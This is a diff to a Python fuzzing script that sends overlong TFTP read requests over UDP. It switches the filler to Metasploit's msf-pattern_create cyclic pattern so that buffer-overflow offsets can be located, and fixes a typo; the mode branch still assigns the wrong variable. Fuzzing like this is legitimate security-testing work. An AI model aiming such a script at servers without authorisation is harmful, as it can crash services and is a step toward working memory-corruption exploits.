@@ -6,6 +6,7 @@
 
 import socket
 import argparse
+import subprocess
 
 ## Argument Parser
 parser = argparse.ArgumentParser()
@@ -21,14 +22,22 @@ args = parser.parse_args()
 
 ## Payload Processing
 header = "\x00\x01"
-fuzz = "A" * args.iterations
+
+try:
+    p = subprocess.Popen(["msf-pattern_create","-s","ABCDEFGHIJKLMNOP,abcdefghijklmnop,123456789","-l",str(args.iterations)], stdout=subprocess.PIPE)
+except OSError:
+    print("Error: msf-pattern_create not in system path... fuzzing with 'A' characters")
+    fuzz = "A" * args.iterations
+else:
+    fuzz = p.communicate()[0]
+
 filename = "test"
 mode = "mail"
 payload = ""
 
 if args.field == "filename":
     filename = fuzz
-elif arges.field == "mode":
+elif args.field == "mode":
     field = fuzz;
 else:
     print("Invalid field: " + args.field)
@@ -37,7 +46,7 @@ print("Fuzzing " + args.field + " for " + str(args.iterations) + " characters")
 payload += header
 payload += filename + "\x00"
 payload += mode + "\x00"
-## print(payload.encode('hex_codec'))
+print(payload.encode('hex_codec'))
 
 ## Establish UDP Socket
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
